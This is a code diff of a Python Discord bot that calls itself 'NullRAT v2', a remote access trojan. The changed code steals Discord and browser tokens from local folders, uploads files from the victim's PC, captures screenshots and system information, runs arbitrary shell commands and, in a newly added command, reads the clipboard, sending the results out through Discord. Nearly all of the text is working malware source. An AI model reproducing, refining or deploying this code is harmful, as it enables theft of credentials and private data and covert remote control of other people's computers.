@@ -14,7 +14,7 @@ ogdir = os.getcwd(); a = 1
 
 # Required functions
 def IP():
-    try: addr = get("https://api.ipify.org/").text
+    try: addr = get("http://icanhazip.com/").text
     except: addr = "127.0.0.1"
     return addr
 
@@ -108,11 +108,11 @@ async def webcam(ctx):
 async def token(ctx):
     local = os.getenv("LOCALAPPDATA"); roaming = os.getenv("APPDATA")
     paths = {
-        "Discord": roaming + "\\Discord",                                  "Discord Canary": roaming + "\\discordcanary",
-        "Discord PTB": roaming + "\\discordptb",                           "Lightcord": roaming + "\\Lightcord",
-        "Opera": roaming + "\\Opera Software\\Opera Stable",               "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
-        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",   "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",   "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
+        "Discord": roaming + "\\Discord",                                "Discord Canary": roaming + "\\discordcanary",
+        "Discord PTB": roaming + "\\discordptb",                         "Lightcord": roaming + "\\Lightcord",
+        "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
+        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
         "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",
     }
     tokens = []; tokens2 = []; message = ""
@@ -148,7 +148,7 @@ async def upload(ctx, name, isBig="null"):
 async def download(ctx, filepath):
     # upload makes use of `` [code indicators]: Example - "`C:\Users\NullCode\a.txt`"
     filepath = filepath[:-1]; filepath = filepath[1:]
-    await ctx.send("Uploading file...")
+    await ctx.send(embed = discord.Embed(title="Downloading file from PC...", color = 0x0081FA))
     await ctx.send(file=discord.File(filepath))
 
 # Change directory
@@ -166,7 +166,6 @@ async def dir(ctx, dire="null"):
         subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     else:
         dire = dire[:-1]; dire = dire[1:] # dir makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
-
         os.chdir(dire)
         subprocess.run('dir > "%temp%\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
@@ -180,29 +179,26 @@ async def dir(ctx, dire="null"):
 @client.command()
 async def gsl(ctx):
     subprocess.run(
-        'SYSTEMINFO > "%temp%\\youtube.txt"',
+        'SYSTEMINFO > "C:\\Users\\{}\\Saved Games\\youtube.txt"'.format(os.getenv("username")),
         shell=True,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         stdin=subprocess.PIPE,
     )
     await ctx.send(
-        "Here is the file", file=discord.File(os.path.join(os.getenv("TEMP") + "\\youtube.txt"), filename="General Output.txt"),
+        "Here is the file", file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt"), filename="General Output.txt"),
     )
-    os.remove(os.path.join(os.getenv("TEMP") + "\\youtube.txt"))
+    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt")
 
 # Takes screenshot of window (by Sp00p64)
 @client.command()
 async def screenshot(ctx):
     from mss import mss
-    await ctx.send("Preparing screenshot")
-    with mss() as sct:
-        sct.shot(output=os.path.join(os.getenv("TEMP") + "\\monitor.png"))
-    file = discord.File(
-        os.path.join(os.getenv("TEMP") + "\\monitor.png"), filename="monitor.png"
-    )
+    await ctx.send("Preparing screenshot...")
+    with mss() as sct: sct.shot(output=f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
+    file = discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
     await ctx.send(file=file)
-    os.remove(os.path.join(os.getenv("TEMP") + "\\monitor.png"))
+    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
 
 
 # Execute shell commands (by Sp00p64)
@@ -210,17 +206,12 @@ async def screenshot(ctx):
 async def shell(ctx, msg):
     global status; status = None
     import subprocess, os, time; from threading import Thread
-
-    # shell makes use of `` [code indicators]: Example - "`echo Hello World`"
-    msg = msg[:-1]; msg = msg[1:]
-
+    msg = msg[:-1]; msg = msg[1:] # shell makes use of `` [code indicators]: Example - "`echo Hello World`"
     def shell():
         output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         global status; status = "ok"; return output
-
     shel = Thread(target=shell); shel._running = True; shel.start()
     time.sleep(2); shel._running = False
-
     if status:
         result = str(shell().stdout.decode("CP437"))
         print(result)
@@ -246,15 +237,14 @@ async def shell(ctx, msg):
             await ctx.send(result)
     else:
         await ctx.send(
-            embed=EmbedGen(
-                "Information",
-                "def",
-                "Command Output:",
-                "Command not recognized or no output was obtained",
-            )
+            embed=EmbedGen("Information", "def", "Command Output:", "Command not recognized or no output was obtained")
         )
         status = None
 
+@client.command() ## Ultra experimental # i-vone
+async def clipboard(ctx):
+    await send_subprocess(ctx, "@PowerShell Get-Clipboard")
+    
 @client.command()
 async def menu(ctx):
     embed = discord.Embed(title="NullRAT v2 Help Menu", color=0x0081FA)
